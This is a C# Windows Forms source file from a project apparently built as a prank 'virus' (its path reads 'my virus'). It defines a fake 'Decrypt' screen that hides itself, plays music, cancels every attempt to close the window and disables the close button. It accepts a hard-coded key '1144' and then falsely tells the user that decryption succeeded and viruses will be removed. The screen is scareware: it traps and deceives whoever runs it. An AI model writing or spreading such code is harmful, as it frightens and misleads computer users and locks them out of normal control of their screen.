using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Feedback_Hub.Form1;

namespace Feedback_Hub
{
    public partial class Decrypt : Form
    {
        
        public Decrypt()
        {
            InitializeComponent();

            this.ControlBox = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string key;
            key = textBox1.Text;
            if(key=="1144")
            {
                MessageBox.Show("succsessfully decrypted. \nPlease restart your PC and all viruses will be removed..");
            }
            else
            {
                MessageBox.Show("Wrong key try again..", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            new Form1().Show();
            this.Hide();
        }

        private void Decrypt_Load(object sender, EventArgs e)
        {
            this.Visible = false;
            //hides code

            //music
            System.Media.SoundPlayer player = new System.Media.SoundPlayer();
            var username = System.Environment.GetEnvironmentVariable("USERNAME");
            player.SoundLocation = "C:\\Users\\" + username + "\\Desktop\\my virus\\Feedback Hub\\Feedback Hub\\bin\\Debug\\music\\chrishan - sin city ( slowed + reverb ).wav";
            player.Play();
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Cancel any attempts to close the form
            e.Cancel = true;
            base.OnFormClosing(e);
        }
        protected override CreateParams CreateParams
        {
            get
            {
                const int CS_NOCLOSE = 0x200;

                CreateParams cp = base.CreateParams;
                cp.ClassStyle |= CS_NOCLOSE;
                return cp;
            }
        }
    }
}
